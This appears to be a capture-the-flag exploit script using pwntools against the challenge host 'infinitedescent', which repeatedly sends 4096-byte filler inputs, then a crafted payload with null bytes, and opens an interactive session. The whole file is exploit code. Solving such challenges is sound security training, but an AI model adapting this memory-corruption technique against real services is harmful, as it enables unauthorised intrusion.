from pwn import *

r = remote("infinitedescent.chal.irisc.tf", 10002)
r.recvuntil(b"===")
r.send(input("pow: "))

from tqdm import tqdm
for _ in tqdm(range(15)):
    r.recvuntil(b"newline.\n")
    r.sendline(b"4096")
    r.recvuntil(b"newline.")
    r.sendline(b"a" * 4096)

r.recvuntil(b".\n")
r.sendline(b"3072")
r.sendline(b"@'\x00\x00" + b"a"*3068)
r.sendline(b"0000\n")
r.interactive()
